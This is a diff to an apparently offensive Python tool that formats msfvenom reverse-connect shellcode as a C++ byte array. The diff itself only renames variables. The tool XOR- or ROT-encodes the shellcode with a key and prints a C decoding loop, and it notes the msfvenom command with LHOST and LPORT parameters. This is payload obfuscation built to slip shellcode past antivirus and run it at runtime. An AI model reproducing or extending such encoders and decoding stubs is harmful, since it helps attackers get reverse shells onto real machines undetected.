@@ -108,7 +108,7 @@ elif args.format == "cpp":
     payload = re.sub("(.{64})", "    \"\\1\"\n", ''.join(encodedPayload), 0, re.DOTALL)
     payloadFormatted  = f"// msfvenom -p {args.payload} LHOST={args.lhost} LPORT={args.lport} EXITFUNC=thread -f csharp\n"
     payloadFormatted += f"// {args.encoding}-encoded with key {hex(args.key)}\n"
-    payloadFormatted += f"unsigned char buffer[] =\n    {payload.strip()};"
+    payloadFormatted += f"unsigned char buf[] =\n    {payload.strip()};"
     if payLen > 1000:
         f = open("/tmp/payload.txt", "w")
         f.write(payloadFormatted)
@@ -121,17 +121,17 @@ elif args.format == "cpp":
     # Provide the decoding function for the heck of it
     print(f"{bcolors.BOLD}{bcolors.OKBLUE}[i] Decoding function:{bcolors.ENDC}")
     if args.encoding == "xor":
-        decodingFunc = f"""char bufferx[sizeof buffer];
+        decodingFunc = f"""char bufx[sizeof buf];
 int i;
-for (i = 0; i < sizeof bufferx; ++i)
-    bufferx[i] = (char)(buffer[i] ^ {hex(args.key)});
+for (i = 0; i < sizeof bufx; ++i)
+    bufx[i] = (char)(buf[i] ^ {hex(args.key)});
         """
 
     if args.encoding == "rot":
-        decodingFunc = f"""char bufferx[sizeof buffer];
+        decodingFunc = f"""char bufx[sizeof buf];
 int i;
-for (i = 0; i < sizeof bufferx; ++i)
-    bufferx[i] = (char)(buffer[i] - {hex(args.key)} & 255);
+for (i = 0; i < sizeof bufx; ++i)
+    bufx[i] = (char)(buf[i] - {hex(args.key)} & 255);
         """
 
     print(decodingFunc)
